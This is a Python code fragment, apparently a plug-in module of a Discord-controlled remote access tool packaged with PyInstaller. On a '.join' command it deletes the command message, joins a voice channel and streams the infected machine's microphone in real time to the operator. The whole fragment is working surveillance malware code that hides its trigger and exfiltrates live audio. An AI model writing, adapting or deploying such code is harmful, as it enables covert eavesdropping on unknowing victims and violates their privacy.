from resources.misc import *
import pyaudio
import sys
import os
# end of imports

# on message
elif message.content == '.join':
    await message.delete()
    vc = await client.get_channel(channel_ids['voice']).connect(self_deaf=True)
    vc.play(PyAudioPCM())
    await message.channel.send('`[' + current_time() + '] Joined voice-channel and streaming microphone in realtime`')

# !opus_initialization
bundle_dir = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
opuslib_path = os.path.abspath(os.path.join(bundle_dir, './libopus-0.x64.dll'))
discord.opus.load_opus(opuslib_path)

# anywhere
class PyAudioPCM(discord.AudioSource):
    def __init__(self, channels=2, rate=48000, chunk=960, input_device=1) -> None:
        p = pyaudio.PyAudio()
        self.chunks = chunk
        self.input_stream = p.open(format=pyaudio.paInt16, channels=channels, rate=rate, input=True, input_device_index=input_device, frames_per_buffer=chunk)

    def read(self) -> bytes:
        return self.input_stream.read(self.chunks)
